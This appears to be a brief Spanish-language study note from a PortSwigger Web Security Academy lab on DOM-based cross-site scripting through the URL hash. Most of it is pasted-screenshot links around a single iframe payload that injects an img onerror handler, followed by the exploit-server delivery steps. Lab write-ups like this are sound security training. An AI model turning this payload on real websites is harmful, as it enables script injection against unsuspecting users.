![[Pasted image 20220815193732.png]]

la siguiente funcion empotrada hace vulnerable la página:

![[Pasted image 20220815193838.png]]

iframe src="https://0a3200de0329d7a9d0e909940031008f.web-security-academy.net/#" onload="this.src+=' img src=x onerror=print() '"/iframe

![[Pasted image 20220815194320.png]]

La secuencia es: store -> view exploit -> deliver to victim


![[Pasted image 20220815194240.png]]